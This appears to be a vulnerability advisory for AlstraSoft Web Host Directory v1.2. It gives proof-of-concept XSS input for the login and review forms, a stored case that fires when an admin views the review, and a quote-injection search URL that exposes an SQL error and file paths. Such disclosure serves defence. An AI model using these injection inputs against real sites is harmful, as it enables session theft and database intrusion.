Subject: AlstraSoft Web Host Directory v1.2


AlstraSoft Web Host Directory v1.2

Homepage:
http://www.alstrasoft.com/

((It should be noted too that the demo for this script is on a different domain which also sells a WebHost Directory which looks to be the same product/company called HyperStop WebHost Directory 1.2. Both scripts seem to be the same))

Effected files:

Login form of script.
Search form of script.
Review form of script.
------------------------------------------

Exploits & Vulns:

Inserting html codes in the login form such as:

<DIV STYLE="width: expression(alert('XSS'));">

produces the following full path error:

Warning: mysql_result(): supplied argument is not a valid MySQL result resource in /home/username/public_html/

demo/webhost/include/login.php on line 6

---------------------------

URL Injection of the search url reveals SQL Query error:

Example:
http://www.example.com/demo/webhost/search/?uri='

Unknown column 'p.' in 'where clause'
[SELECT COUNT(*) FROM `hsl_plan` p LEFT JOIN `hsl_host` h ON p.hid=h.hid WHERE p.status=1 AND p.``='']

--------------------------

Input data isn't filtered in the write a review box. This in turn can cause a XSS. For proof of concept, just try putting 

<DIV STYLE="width: expression(alert('XSS'));"> in as the review text and then login in as the admin and view your review. Reviews have an option to be auto approved too.
